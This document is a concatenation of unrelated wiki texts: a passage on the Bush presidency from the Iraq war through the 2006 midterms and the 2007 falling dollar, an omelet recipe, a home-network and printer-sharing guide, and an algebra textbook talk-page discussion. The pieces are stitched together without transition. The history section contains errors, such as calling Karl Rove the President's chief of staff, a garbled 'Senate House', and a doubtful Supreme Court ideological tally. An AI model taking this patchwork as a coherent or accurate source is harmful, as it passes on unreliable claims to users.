In his 2002 State of the Union address, Bush named Iraq, Iran, and North Korea as a part of the &quot;Axis of Evil,&quot; a phrase he partially coined from the World War II Axis Powers. President Bush specifically named these three countries because they were all described as rogue states, either fostering terrorists or trying to obtain nuclear weapons.

The successful invasion of Afghanistan was the first time that the newly adopted '''Bush Doctrine''' had been carried out. The Bush Doctrine stated that there was no difference between a terrorist and one who fosters a terrorist, and that the U.S. would practice pre-emptive strikes against perceived threats to American security (acting alone if needed), as it was the United States' duty to spread freedom and democracy to the rest of the world.

===War in Iraq===

In the middle of 2002, the United Nations began focusing its attention on Iraq, as American and international intelligence agencies had intelligence indicating that Iraq possessed a number of Weapons of Mass Destruction (WMD), as well as the ongoing capacity to produce them. The United Nations Security Council passed Resolution 1441, requiring Iraq to open up to U.N. weapons inspectors or else face &quot;serious consequences.&quot; Two of the veto-wielding members (France and Russia) of the Security Council did not wish to use military force against Iraq, and promised to veto any resolution ordering such force.

As a result to a perceived security threat verified by intelligence (which has now been found to have been unreliable), President Bush and a number of allies, deemed by the President as the &quot;coalition of the willing,&quot; began the invasion without U.N. sanction. On the night of March 17, 2003, President Bush gave Hussein and his two sons, Uday and Qusay, an ultimatum to leave Iraq in 48 hours or face an invasion. They refused. After the expiration of the deadline given by the President, the invasion of Iraq began. The invasion lasted only a short time, and the Iraqi government and military collapsed within three weeks.

Uday and Qusay Hussein were killed in a firefight with U.S. forces in July. Saddam Hussein was found in a spider-hole and captured on December 13. Weapons of Mass Destruction were never located in Iraq. Continued suicide bombings and the ongoing American casualties led to a steady decline in American popular support for the war.

The invasion of Iraq is considered by many to mark the end of the political unity following the September 11th attacks. Although both the public and Congress favored going to war by overwhelming majorities, a substantial minority expressed reservations about invading. Many feared that the administration lacked a plan for rebuilding once the war was over. Still others worried that an invasion would alienate U.S. allies. On February 15, just one month before the invasion commenced, millions protested worldwide, including hundreds of thousands in 150 U.S. cities.

===Gay Marriage===
Another key issue of the 2004 election was the issue of same-sex marriage. On November 18, 2003, the Massachusetts Supreme Court ruled that the banning of gay marriage is unconstitutional, thereby allowing gay marriage in that state. Following the Massachusetts ruling, California, Vermont, Maine, Hawaii, New Jersey, the District of Columbia, and Connecticut allow for same-sex civil unions, reciprocal benefits, or domestic partnerships. In February 2004, President Bush called for a constitutional amendment defining marriage as between a man and a woman. The Senate looked into the issue, but only a minority supported the provision, while a two thirds majority is needed to pass an amendment in Congress.&quot;The union of a man and a woman is the most enduring human institution, honored and encouraged in all cultures and by every religious faith,&quot; Bush said.

&quot;Marriage cannot be severed from its cultural, religious and natural roots without weakening the good influence of society.&quot;

The gay rights movement took a major hit on Election Day, when seven states (Georgia, Arkansas, Michigan, North Dakota, Kentucky, Oklahoma, and Utah) made it unconstitutional for marriage, civil unions, or domestic partnerships between same-sex couples. Three more (Oregon, Mississippi, and Montana) made it illegal only for homosexuals to marry, and one more (Ohio) passed an amendment illegalizing any benefits whatsoever for homosexual couples.

==2004 Election==
[[Image:John F. Kerry.jpg|200px|left|thumb|John Kerry]]
Bush won renomination by the Republicans in the 2004 election unopposed.  In contrast, ten Democrats sought their party's nomination. Massachusetts senator John F. Kerry, whose campaign was declared dead by some commentators only a few weeks earlier, won the Iowa Caucus.  Senator John Edwards of North Carolina, whose campaign had cash but never any traction, picked up a surprise strong second. At the Democratic Convention in July, all the other candidates, save Dennis Kucinich, released their delegates to Kerry.  As a result, Kerry became the Democratic nominee for President.

Kerry chose Senator Edwards, ostensibly the Democratic candidate who received second place in terms of delegates, as his running mate. Kerry was recognized as a liberal Senator - he openly supported gay rights and same sex civil unions, was pro-choice and supported embryonic stem cell research, and opposed drilling in Alaska for oil. The Bush campaign targeted Kerry as a &quot;flip-flopper,&quot; a term coined by the campaign to indicate that the Senator from Massachusetts changed his position constantly.  The flip-flopping label was directed particularly toward Kerry's positions on the war in Iraq.  In regard to a bill that passed the United States Senate providing $87 billion in funding to the war, Senator Kerry made the remark that &quot;I actually voted for the eighty-seven billion - before I voted against it.&quot;  The Bush campaign took advantage of this remark and used it as the epicenter of their flip-flopping campaign against the Senator.
[[Image:US presidential election 2004 map.svg|thumb|250px|The 2004 Presidential election.]]
Polling had indicated the election would be very close. This proved relatively true on Election Day. Bush was able to widen his margin of victory in Florida this time around. The results from this election were far more decisive than in 2000. In the popular vote Bush won 51%, while Kerry won 48%.  The final electoral vote total was 286 for Bush and 251 for Kerry (with one Minnesota elector casting a ballot for John Edwards for both President and Vice President). Additionally, Republicans strengthened their hold in both houses of Congress, particularly increasing their majority in the Senate to 55-44. The strengthening of the control of the Senate would be important to the Republicans in the following year.

== The Start of a New Term ==

===Social Security===
Created in 1935, Social Security OASDI is a government program that provides most seniors with a steady income based on the real value of their prior earnings, funded by a 6.2% tax on each workers' pay and and on each employers' payrolls. Surpluses are held in Treasury securities in special Trust Funds which are credited with interest. The surplus is projected by government actuaries to peak around 2018 or 2019 and then to decline until the Trust Funds are exhausted in sometime between 2042 and 2052.

In the latter part of his first term and in his 2004 campaign, Bush focused on the issue of Social Security, and how to prevent its bankruptcy. He proposed a plan to have young workers set up stock funds which might turn out to produce better retirement benefits than OASDI but would not solve the system deficits. Many experts expect that the only long-term solution is a tax increase of about 2 percent of payroll, or a government subsidy of the same size.

===Cabinet Replacements===
At the start of his second term, Bush's cabinet saw significant changes.  Colin Powell departed as Secretary of State, replaced by National Security Advisor Condoleeza Rice, the first African American female to hold the position. Alberto Gonzales replaced John Ashcroft as attorney general the first Mexican American to hold this post. Tom Ridge, former Governor and Vietnam War hero, also resigned from the post of Secretary of Homeland Security. Michael Chertoff, a Justice Department official, took his place.

===The Double Vacancy on the Supreme Court===
[[Image:William Rehnquist official portrait 1972.jpg|thumb|180px|left|Rehnquist portrait as an Associate Justice in 1972.]]
In October, 2004, William H. Rehnquist was diagnosed with thyroid cancer. In July, 2005, he informed the press that he would remain on the Court as long as his health permitted.

Despite all expectations, Sandra Day O'Connor ended up being the first member of the Court to retire. Prior to O'Connor's retirement, the Court had consisted of three conservatives, five liberals, while O'Connor was the Court's swing vote. In many cases relating to restrictions on abortion, affirmative action, and detention of unlawful combatants, O'Connor had been the deciding vote. Liberals feared the replacement of O'Connor with a conservative, while conservatives realized that the replacement of O'Connor would leave them only one vote away from a majority on the Court.

====John Roberts====
[[Image:John Roberts.jpg|thumb|200px|right|Chief Justice John G. Roberts]]On July 19, President Bush nominated John Roberts, a judge serving on the US Circuit Court of Appeals for the District of Columbia, to fill the vacancy created by O'Connor. Liberals were for the most part against the Roberts nomination, claiming that he would be far to the right of O'Connor. Conservatives had mixed reactions, based on quotes he had made concerning ''Roe v. Wade''.

On September 3, 2005, Chief Justice William H. Rehnquist died of complications from thyroid cancer, creating a double vacancy. On September 6, President Bush withdrew the nomination of Roberts to the office of Associate Justice and instead nominated him to be Chief Justice. The Senate Judiciary Committee began holding hearings for John Roberts on September 12. On September 22, the Committee voted 13-5 to approve the Roberts nomination. On September 29, the Senate confirmed the nomination of John Roberts to the Supreme Court by a vote of 78-22. Hours later, Associate Justice John Paul Stevens swore him in as the seventeenth Chief Justice of the United States.

====Samuel Alito====

Having successfully nominated John Roberts to the Supreme Court, Bush now turned his attention back to filling O'Connor's vacancy. On October 3, 2005, he chose the White House Counsel, Harriet Miers. Miers withdrew her nomination on October 27, 2005, after weeks of criticism. On the morning of October 31, 2005, President Bush announced the nomination of a Circuit Court judge named Samuel Alito.

[[Image:Bush-Alito-051031.jpg|thumb|350px|left|Samuel Alito acknowledges his nomination, with President George W. Bush looking on.]]
Conservatives were quick to applaud President Bush for nominating Alito to the Court, and liberals were quick to oppose the new nomination. Conservatives saw in him a competent judge who would develop a truly conservative reputation on the Court and oppose ''Roe v. Wade''. Unlike with the Miers nomination, Bush's conservative base was mostly in support of the Alito nomination.

On January 24, 2006, the nomination of Samuel Alito was approved by the Committee, and the Senate debates began the next day. On January 31, 2006, Samuel Alito was confirmed by the Senate by a vote of 58-42. Thereafter, Sandra Day O'Connor officially retired. Samuel Alito was sworn in as the 110th Associate Justice hours later. The next day, he was ceremonially sworn in.

==Souring Public Mood==

A confluence of events, beginning at the end of 2005, began to turn public opinion against the Bush Administration and the Republican-controlled congress, and, as many argue, toward the opposition Democrats in the 2006 election year.

===Hurricane Katrina===

The summer of 2005 saw a very active hurricane season, with a total of five hurricanes striking the Gulf Coast. Of these, on August 29, Hurricane Katrina, struck New Orleans as a strong, 'category three' hurricane, breached the levees on Lake Pontchartrain, flooding the city, devastated the surrounding coasts of Alabama, Mississippi, and to a lesser extent, the already struck Florida panhandle (it also struck South Florida, but the effects were far less than those seen in the Gulf). The catastrophic flooding and subsequent responses from all levels of the government highlighted many far reaching deficiencies in the government's ability to protect the country in times of disaster.
[[Image:Navy-FloodedNewOrleans.jpg|thumb|right|350px|An aerial view of the flooding in part of the Central Business District of New Orleans. The Louisiana Superdome is at center.]]
Mistakes at the state and local levels were made primarily before the storm. The most glaring mistake made by the state of Louisiana was its issuance of evacuation orders, but no provision of transportation for the estimated 120,000 poor, elderly, and sick unable to leave the inner city. After the storm struck, governor Kathleen Blanco's (of Louisiana) alleged refusal to give control of the state's National guard troops to the President caused the rampant looting crisis in the city to be firmly her responsibility. She did not commit herself to fighting the looting in the city until September 2, nearly five days after landfall.

But by far, most criticism was directed towards the federal response and the Bush Administration. The American people, aided by angry criticism from the news media, perceived the response as proof that America was woefully unprepared for another disaster, even after the governmental reforms following 9/11. President Bush did not survey the disaster area until August 31, and was criticized by the media for treating the disaster too casually. President Bush is famously quoted as saying &quot;Brownie, you're doing one heck of a job.&quot; This was the same day that Michael Brown, head of the Federal Emergency Management Agency (FEMA) and the man he was referring to, told reporters that he and the federal government were unaware of the horrific conditions in the Louisiana Superdome (the primary shelter for those unable to evacuate), even though the news media had been reporting on them for days.

The result of the storm was a realization by the American people that disaster relief agencies were unprepared for what they were created to do. President Bush's approval dropped to its lowest point during his entire presidency, and he was accused of cronyism for hiring unqualified officials to the Department of Homeland Security. Congressional hearings to investigate the matter were to commence in the coming months.

===Growing Scandal===

In addition to complaints of cronyism, a multitude of scandals were brewing in Washington. The CIA Leak scandal (&quot;Plamegate&quot;) involved pre-Iraq War intelligence. Joseph C. Wilson, a former diplomat to African countries in previous decades, was recommended by his wife, CIA agent Valerie Plame, to investigate claims that Iraq was buying uranium from Niger. He alleges that he found no connection between the two countries, but President Bush said in his January 2003 State of the Union Address that &quot;The British government has learned that Saddam Hussein recently sought significant quantities of uranium from Africa.&quot; That summer, Wilson wrote a column in the New York Times that was highly critical of this remark, and told reporters in several anonymous interviews that the Bush administration was misrepresenting intelligence. A few days after Wilson's column was published, the Washington Post published a column in its paper revealing the identity of the undercover Valerie Plame, thus ruining her career as an agent. Wilson claimed that high officials, namely Karl Rove, the President's chief of staff and a top Republican strategist, leaked her identity to the paper for &quot;retribution&quot; for Wilson's dissent.
[[Image:scooter_Libby.jpg|thumb|200px|left|I. Lewis &quot;Scooter&quot; Libby]]
Eventually, an investigation into the matter was opened up. It is illegal for high officials, elected or not, to leak classified information without going through a declassification process. A special prosecutor, Patrick Fitzgerald of Illinois, was appointed to head the investigation. In 2005, he indicted Lewis &quot;Scooter&quot; Libby, Vice President Cheney's chief of staff, for perjury and obstruction of justice in the investigation. Later, Libby testified that he was authorized by White House &quot;superiors&quot; to leak classified info regarding prewar intelligence. The investigation remained ongoing, and many speculated that Fitzgerald was aiming to indict a higher official for the actual investigated offense, leaking Plame's identity, rather than lying to investigators.

Meanwhile, investigations regarding lobbying and political corruption in Congress were ongoing. Jack Abramoff, a top Republican lobbyist, pleaded guilty in early 2006 to three felony charges related to his defrauding of his Native American tribe lobbying clients and tax evasion. He consented to enter a plea bargain in which he agreed to testify in related Congressional corruption investigations in return for a lesser sentence. 

Late in 2005, the House Republican leader, Tom Delay, was indicted for conspiracy to violate election law, money laundering, and conspiracy to engage in money laundering. Because of the indictments, Republican house rules forced Delay to temporarily step down as majority leader. A judge threw out the election law violations, but upheld the other charges, causing the rest of Delay's caucus to successfully pressure him to permanently step down as majority leader. Eventually, Delay's heavy association with a litany of scandals forced him to resign from the House in order for his party to retain his congressional seat.

===2006 Midterm Elections===
The Democrats won back the House and the Senate. This mid-term election is notable for the fact that no incumbent Democrat vying for a national congressional position was voted from office.
The Democratic party gained control of six Senate seats by defeating Republican senators in the states of Montana, Pennsylvania, Missouri, Rhode Island, Ohio, and Virginia. The Democrats gained a 51–49 majority in the Senate House. The Democratic party gained thirty House seats from the Republican party. This was the first time since the midterm elections of 1994, the Democratic Party gained control of both houses of the United States Congress.

===Falling Dollar===
The U.S. economy and its currency as an instrument of world trade has suffered a series of major setbacks in recent months. Some analysts say that the Federal Reserve's September 18th dramatic rate cut to 4.75% from 5.25% may be a case of &quot;too little, too late&quot;, or that it was excessive and dooms the dollar.

On September 20, 2007, Saudi officials declined to cut interest rates in lockstep with the US Federal Reserve for the first time in decades. According to Ambrose Evans-Pritchard, International Business Editor for The Daily Telegraph, &quot;it's a signal that the oil-rich Gulf kingdom is preparing to break the dollar currency peg in a move that risks setting off a stampede out of the dollar across the Middle East.&quot;

Hans Redeker, the Currency Chief at BNP Paribas, stated that Saudi Arabia's move to not adjust their own interest rates in sync with the Fed's cuts is a very dangerous situation for the US dollar. Redeker points out that &quot;Saudi Arabia has $800bn (£400bn) in their future generation fund, and the entire region has $3,500bn under management. They face an inflationary threat and do not want to import an interest rate policy set for the recessionary conditions in the United States.

American consumers, meanwhile, stood to be hurt. A drooping dollar means that foreign imports should cost more, from Murano glassware to French candles, to the Middle Eastern oil that powers the boats that bring all this stuff to America.

{{recipe}} | [[Cookbook:Breakfast Recipes|Breakfast Recipes]] | [[Cookbook:Omelet Recipes|Omelet Recipes]]

==Ingredients== 
*3 large [[Cookbook:Egg|eggs]]
*2 medium (10 oz) slices of cooked [[Cookbook:Bacon|bacon]]
*2 slices of American [[Cookbook:Cheese|cheese]]
*1 [[Cookbook:Tablespoon|Tablespoon]] of [[Cookbook:Butter|butter]]
&lt;br clear=&quot;all&quot;&gt;

==Equipment==
*10&quot; Non-stick [[Cookbook:Frying pan|skillet]]
*Non-stick [[Cookbook:Spatula|spatula]]
*[[Cookbook:Fork|Fork]] or [[Cookbook:Whisk|whisk]]
&lt;br clear=&quot;all&quot;&gt;

==Procedure==
#Cut or break bacon into one-inch pieces.
#Cut or break slices of cheese into one-inch-wide strips.
#Melt the butter in a pan over a high heat. Make sure the pan is evenly covered in butter.
#When half the butter is melted, turn the heat to medium.  
#Beat or whisk eggs until evenly colored.
#Pour in the eggs, and rotate the pan so that the egg covers the entire surface of the pan.
#Continue rotating until the edges become thick, then use a spatula to lift side of now cooked egg, allowing the remaining liquid egg from the centre to flow underneath on to the pan and start cooking.  Continue to rotate the pan and move the spatula to adjacent areas until most of the liquid egg is cooked.
#Lay the cheese down one side of the centre of the omelette.
#Place the bacon on top of the cheese.
#Carefully, flip the side with no ingredients over the top of the bacon and cheese side, so you now have a semi-circle omelette.
#Turn to low heat until cheese has melted. Makes two servings; great with vegetables or salad.

      <text xml:space="preserve">==Setting Up A Home Network==
# First let's understand the basic pieces of a home network. We all know what a network is, right? A network is a set of hardware and software technologies that allow all the PCs in the home to connect to each other and to the Internet. One example of a network that most PCs connect to is the internet. The internet is generally easy to join, but slow, open, and unsecured.
# How is the home network built? A network is built by connecting one or more operating systems together allowing for communication between the two. Usually this is done using hardware devices which move the data from computer to computer, and software programs that convert the sent data and read the received data. A home network is easily built by using a [[w:router|broadband router]] which acts as a server to create the network for your home. In addition, routers connect to the larger internet and thus allow the home network computers to all connect to the internet simultaneously.
# To get onto the internet through a router, you need broadband internet. Broadband internet is commonly provided by cable and phone companies in the form of cable internet and DSL respectively. They require special modems to connect to their service, called broadband modems. A broadband modem is a device that allows you to quickly send and receive information from the Internet. DSL modems and cable modems are the two popular types of broadband modem. For the most part, cable modems are easier to configure and use, requiring only plugging in the cable line to the modem and the Ethernet cord to the router. The DSL modem requires users to log on to the ISP in order to get Internet access working. 
# The broadband router is usually a small box - popular companies that make them are Linksys, Netgear, and DLink. One of the router's functions is to share a single Internet account with all the PCs and other devices in the home that want access to the Internet. Usually your Internet Service Provider (ISP) gives you one IP address. An IP address is a unique number for your computer's network card in a particular network (In the case of the ISP, it gives an IP address for the internet). The router works by splitting the single IP address given by your ISP into routable units that go to each computer within your home network, using special numbers that are read by the router. The router then sends the appropriate data to the appropriate IP address  of the computer in the home network [[w:NAT|Network Address Translation (NAT)]]. 
# Let's look at the typical router. You will see a series of [[w:Ethernet|Ethernet]] ports (which look like enlarged telephone line plugs), with one usually not grouped with the others or labeled differently (oftentimes labeled WAN). This port is used to connect to the cable or DSL modem using a [[w:CAT5|CAT5 cable]]. The other Ethernet (Local Area Network) ports, which are used to attach the home PCs' Ethernet cards. Some routers have the capability to provide wireless networking. A wireless router will also sport one or two antennae, for the purpose of providing a wireless connection to computers with [[w:wireless network|wireless network]] cards.

==Different Uses of Networks==
===Sharing Internet Connection===
As the setting up section explains.  One of the most basic features of home networking is sharing Internet access between two computers.  This can be done with DSL, cable modem, or dial-up.  

===Files Sharing===
===Print Sharing===
There are two major ways to share a printer across the network. The first requires a stand-alone printer, the other is using a printer that is connect to a computer. 

A stand-alone printer is a printer that does not require being attached to a computer to use. Common examples are large office printers. They each have their own network card that allows them to connect directly into the network. These printers then can be assigned a network address, or a host name that allows other computers on the network to find them. In order to set these up please refer to your printer's administration manual.

Most modern printers also have a web-administration guide. A web administration guide shows options that can be set for the printer using a web-based interface. To get to it, you simply open your web browser and put the host name of the printer or the IP address. This will usually ask you for an administrator's account and password to change settings. This will be found in the administration manual, or you may have set it when setting up the printer's IP address.

Next, you will have to install the printer drivers and software on each computer that you want to have use of the printer.

In Windows XP:

# Click on the start menu
# Choose Run
# Type in: Control Panel and press enter
# Click Printers and Other Hardware
# Choose Printers and Faxes
# Under Printer Tasks, choose Add Printer
# Click Next, Choose Network Printer, Click Next
# Choose the bottom option to &quot;Connect to this printer (or browse for a printer...)&quot;
# In the text box, type in the host name or the IP address of the printer
# It will ask you if you would like to install the printer, connect yes
# It will then install the printer and tell that it has been installed!

The second option is to install a printer that is connected to another computer. First, you need to install the printer according to the instructions provided by the manufacturer on the computer. Next, you will need to get the computer's network name. 

This is done in Windows XP by:

# Click on the start menu
# Choose run
# type cmd and press enter
# type in ipconfig /all and press enter
# write down the host name

Next, go to the computer that you want to connect to the printer.

In Windows XP:

# Click on the start menu
# Choose Run
# Type in: Control Panel and press enter
# Click Printers and Other Hardware
# Choose Printers and Faxes
# Under Printer Tasks, choose Add Printer
# Click Next, Choose Network Printer, Click Next
# Choose the bottom option to browse for printer
# Click Next, this should bring up a list of computers on the network
# Find the host name of the computer that the printer is attached to and double click it. (You may have to left-click on the network name before you see the computer).
# It will then show the computer and the attached printer. Choose the attached printer and click next.
# It will ask you if you would like to install the printer, connect yes
# It will then install the printer and tell that it has been installed!

To ensure complete installation, reboot the computer.

== Pre-Algebra ==
I've searched around and I've found no book on pre-algebra, but I've found 4 book on 'algebra I'. Many of these (in my opinion) definitely belong in pre-algebra, especially a lot of the chapters in this book. [[User:Cactusbin|Cactusbin]] ([[User talk:Cactusbin|talk]]) 23:40, 7 April 2009 (UTC)

== Logarithms ==

This book needs a section on logarithms.

http://www.purplemath.com/modules/logs.htm might be a good place to learn about them.

I've put up a basic (and I mean basic) page on logarithms. It probably needs a bit of proofing, as I have a hard time trying to explain things to other people.
[[User:Regre7|Regre7]] 20:13, 13 June 2006 (UTC)

==Logic==
I looked at the logic page and even though I've had introductory logic (Euclidean Geometry), I found the information difficult to understand. I wrote another section, entitled &quot;Statements&quot; that I believe contains the same information as the original page, but in an easier-to-understand format (to me). Before I add more information, I would like to know if anyone likes my style of writing over what was on the logic page.

== radicals in a calculator ==

How you do radicals in a calculator will depend on the model you have. A scientific (or business or statistics) calculator (something other than a graphing calculator) will frequently have a &quot;square root&quot; key and, close by, a &quot;x-th root of y&quot; key. The &quot;square root&quot; key will often be the same as the &quot;squared&quot; key (one of these will be a &quot;second&quot; function for the key); the &quot;x-th root of y&quot; key will often be the same as the &quot;y to the power x&quot; key. The specific key-sequence will vary from model to model, but is often something along the lines of &quot;[intended root] [x-th root of y key] [value you're taking the root of]&quot;. So, for instance, &quot;the fifth root of thirty-two&quot; would be entered as &quot;[5][x-th root key][3][2][=]&quot;, with the calculator returning a value of &quot;2&quot;.

Graphing calculators usually have menu option (rather than a key) that does the same thing, and the key-sequence is similar. But check your owners manual for specifics.

Note: &quot;Radical&quot; may be listed in the manual index under &quot;root&quot;.

== Links from deleted &quot;College Algebra&quot; book ==

Someone had started a &quot;College Algebra&quot; book but didn't really do anything with it, which is good because the material belongs in this one.  Anyway, here are the entire contents of that page, just in case someone wants them:

*[http://www.aquiz.com/page3.html Website with lectures and quizzes.]

*[http://www.wtamu.edu/academic/anns/mps/math/mathlab/col_algebra/index.htm Website with College Algebra introduction and lessons.]

*[http://www.collegeboard.com/student/testing/clep/ex_ca.html The C.L.E.P. College algebra test information.]

== Audience? ==

The supercategory for this book is &quot;primary school mathematics&quot;.  After browsing these pages, I can see that the explanations are all over the map in terms of understanding the audience.  Should the discussion in a primary school algebra text be significantly different from a college algebra text?  I think so, and I think it increases the difficulty of success, since the explanations must be much more than just technically correct - they must also be accessible.  Thoughts?
:This book should not be in the &quot;Primary&quot; category.  It definitely covers way too much stuff.  We're talking about Junior college and up. --[[User:MathMan64|MathMan64]] 05:33, 20 November 2005 (UTC)
::When describing the ''level'' of the audience it would help if everyone explained their terms a little more.  We all of us tend to think first of our own educational experience and terminology but very often this can be either incomprehensible or, worse, misleading to others.  I think I understand what is meant by ''primary'' here but I really don't know what ''junior college'' means.  I think that most of this book was covered in my junior high school years (1966..1969) but whether my junior high school corresponds with anyone else's I have no idea, even with England there were wide differences in terminology and organization of schools.  For the sake of comparison here are the types of educational establishments that I attended (ages in brackets): infants school (5..6), primary school (7..10), junior high school (11..13, that is first to third form), senior high school (14..18, fourth form to upper sixth), university (19..21, bachelor's degree).  My children however are attending schools described like this: grunnskole (6..12), ungdom skole (13..15), videregående skole (16..18) and might go on to any of a wide variety of further education establishments.  Grunnskole can be translated roughly as primary but note that the age range is not the same as the English one, ungdom (literally youth) as junior high school (but note that most UK schools are not divided into junior and senior high schools) and videregående (literally further going) as senior high school.  Perhaps WikiBooks needs a glossary that describes the target audiences.  --[[User:Kwhitefoot|kwhitefoot]] 11:30, 21 November 2005 (UTC)
:::The US system looks like this:  preschool (optional, usually 2 days a week part day)  3-4, Kindergarden:age 5 (sometimes all day, sometimes not), grade school (grades 1-8): 6-14 (sometimes 12-14 is called junior high), high school 14-18 (grades 9-12).  After that is college/university.  A junior college is a 2 year college that does not give out bachellor degrees (sometimes they give out associates).  They tend to offer a lot of adult education courses and tend to be very, very cheap.  People who go there usually are there to save money and finish off at a 4 year college.  

:::Side note:  Most of this book looks like its on a late grade school/high school level.  The only real exception is the linear algebra portion.  Perhaps it ought to be spun off to its own book?--[[User:Javariel|Gabe Sechan]] 17:52, 21 November 2005 (UTC)

I added my comments to [[Wikibooks:Staff_lounge]] because I think that the issue of terminology is important for all books not just this one.  By the way, the description I gave of the UK system was of the system as it was when I attended it in the sixties and early seventies not as it is now.  And before anyone berates me for that let me point out that very few people outside of education know the current system but many can remember the terminology of the one they attended so agreed and documented terminology is even more essential for the avoidance of confusion than one might think. --[[User:Kwhitefoot|kwhitefoot]] 09:19, 22 November 2005 (UTC)

== Things this wikibook needs: ==

* &lt;strike&gt;Multiplication of radicals.
http://www.purplemath.com/modules/radicals.htm would be a good place to learn about them.&lt;/strike&gt;

I added a section for adding, subtracting, multiplying, and dividing radicals. [[User:Regre7|Regre7]] 18:25, 13 June 2006 (UTC)

* How to use a calculator for the radicals in this wikibook. I didn't even know about those types of radicals I only know about the plain square root.

:Perhaps we need a separate &quot;How To&quot; book on the fancier operations on fancier calculators, such as the one I'm working on: [[TI-Lists]].  We could put appropriate links to those from this Algebra book. --[[User:MathMan64|MathMan64]] 20:29, 2 December 2005 (UTC)

* It should ideally be written for the youngest audience possible, with links to proofs of the fundamental or important concepts. My reasoning behind this is that maybe motivated students in middle school or homeschooled children can read and learn the concepts, while college-level students needing to study algebra can see the level of detail necessary for their study. Also, sometimes a proof can give insight about how or why a particular math concept works.

== PDF Version ==

Just to let everyone know, I'm currently compiling the Algebra book into a printable pdf format. I'm not sure why you might need to know, but there we are. [[User:Odd bloke|Odd bloke]] 19:01, 2 December 2005 (UTC)

== Proposed name change ==

I'd like to change the pages in thi book so that they all start with &quot;Algebra/&quot; rather than &quot;Algebra:&quot;. This would make this book consistent with the wikibook naming policy. I trust such a change would be uncontroversial, but note it here in advance to allow a short time for comments, [[User:Jguk|Jguk]] 06:55, 22 March 2006 (UTC)

== Adding lecture notes ==

I'm linking to some lecture notes for a class that I taught at University of Phoenix which I'm making available for inclusion into the text.

See [[Talk:Algebra/ToInclude]]
[[User:Roadrunner|Roadrunner]] 19:43, 17 June 2006 (UTC)

== Reorganizing ==

Some of these sections are beautiful, but some of this is just so oddly order, and they lack rational functions. There doesn't seem to be a logical order, so as soon as I recover from my surgery I plan to re-order and re-do a few/most of the articles, if that is fine with everyone. 
--[[User:Mathos|Jaden Mathos]] 17:16, 14 July 2006 (UTC)

: [[Algebra I - A Verbose Approach]] was an attempt to create a book with a more coherent organization. We should not have multiple books teaching the same subject the same way, so I recommend that you merge that book with the Algebra I content in this book into one [[Elementary Algebra]] book, then move the leftover content to an [[Intermediate Algebra]] book. --[[User:Hagindaz|hagindaz]] 00:43, 15 July 2006 (UTC)


Actually I think I'm going to merge it together into this one book as &quot;Algebra&quot; but split it up into Elementary and Intermediate. Then Advanced if we have any leftover topics.--[[User:Mathos|Jaden Mathos]] 16:19, 15 July 2006 (UTC)

:&quot;Elementary&quot;, &quot;Intermediate&quot;, and &quot;Advanced&quot; sections are too arbitary. You are better off arranging things in terms of individual subjects: &quot;Elementary Algebra&quot;, &quot;Linear Algebra&quot;, &quot;Abstract Algebra&quot;, &quot;Discrete Algebra&quot;, etc. For that matter, I would like to separate out these topics into separate books, instead of all the cross-linked half-books that we have now. Pages about sets, groups, rings, etc should be in &quot;Abstract Algebra&quot;, pages about matrices, determinents, eigenvalues should be in &quot;Linear Algebra&quot;, etc. There is no reason why pages should be in such a bad order, and why pages from one subject should be located in a different book. --[[User:Whiteknight|Whiteknight]] &lt;small&gt;([[User talk:Whiteknight|talk]]) ([[User:Whiteknight/Proposed Books|projects]])&lt;/small&gt; 16:28, 1 September 2006 (UTC)

:I agree with Whiteknight on most of the restructuring issues. It's a good idea for anything beyond a highschool level to be broken down by subject. A number of these subjects can be treated independently of each other, though they require a lot of internal cohesion. However, I'd like to think that the elementary algebra and highschool algebra follow a natural linear progression and would be well suited to fit in the same book. However, there is a question of reading level; early work on arithmetic should be done in a basic english tone while I think it's too tedious to keep such a tone for teaching highschool math. For that reason, perhaps there should be a difference between elementary algebra and intermediate algebra. I think the basic english introduction to algebra --- which is a part of the one laptop for every child program --- should be sufficient for the elementary algebra. I think the rest should be reworked into a single algebra book as Whiteknight proposes: that means role intermediate algebra and the verbose algebra into one algebra book. Also, I'm of the impression that all wikibooks should be verbose to distinguish them from wikipedia articles; they should be linear, provide motivation and assume background. Thus, any articles that don't meet this standard should be assumed broken, as opposed to being the model (this is my argument against the verbose book as a separate book). I'm going to post this comment and more on WhiteKnight's talk page. These are just my opinions --- I hope he'll take the lead. [[User:Ahhoefel|Ahhoefel]] 02:14, 13 March 2007 (UTC)

I agree with Ahhoefel and Whiteknight. They both are correct. If you split them into Elementary, Intermediate and Advanced sections, those sections are too vague. As for Whiteknight's idea about the restructing issues, I agree too. They do not need to see what's inside to give them an idea that they should see. Instead, if you have a subsection saying &quot;Abstract Algebra&quot;, the people will know what they are seeing, and so click on that link.

== Authors ==
The authors of [[Algebra]] include:

*[[w:user:LittleDan|Daniel Ehrenberg]]
*many anonymous Wikibook contributers.

== Mass Reorganization ==

I'm starting my project to completely reorganize this book. I had tried to start this project last semester when I had no time to do it, and now I have the time. Some other authors have expressed some support for this movement, so anybody who wants to help is very welcome to do so. i have created a new template {{tl|Algebra Page}} to be used at the top of every page in this book. --[[User:Whiteknight|Whiteknight]] &lt;small&gt;([[User talk:Whiteknight|talk]]) ([[User:Whiteknight/Proposed Books|projects]])&lt;/small&gt; 22:31, 12 February 2007 (UTC)

== algebra I vs algebra II ==

I think there should be two TOCs, one for algebra I and another for algebra II, since that's the way it's usually taught. Any comments? [[User:Hoogli|Hoogli]] 15:29, 2 June 2007 (UTC)

i agree

== Any recent activity?? ==

I was wondering if anyone is still working on making progress on this book consistently? I would also like to pose a question to those that are concerned with it currently and that is how do you feel about some merges that were suggested probably over a year ago? I like to simplify and condense things and I was wondering if anyone would have a problem with me trying to do that with any of the mathematics books. For example all the different books on Algebra  that cover the same topics. It doesn't make sense to me to have multiple somewhat started books on topics instead of one complete book that expands on every topic or will eventually with our work and cooperation. I'd appreciate any comments or feedback you may have. I've read over this discussion and I couldn't really follow any concensus. Please correct me if I overlooked something or inform me! Thanks! [[User:Jfrederick|Jfrederick]] ([[User talk:Jfrederick|talk]]) 20:56, 2 March 2008 (UTC)

Good question, as it is not 4 years later and there seems to be little progress. As far as merging and splitting, the facts are that Algebra is an abstract subject in its own right, so abstracting even more, particularly what would be called &quot;Beginners&quot; Algebra is not necessarily a good idea. What topics should go where is meaningless if you do not have the essential referants to be able to cope with the more advanced topics and techniques. --[[User:Henry Tallboys|Henry Tallboys]] ([[User talk:Henry Tallboys|discuss]] • [[Special:Contributions/Henry Tallboys|contribs]]) 07:13, 21 May 2012 (UTC)</text>

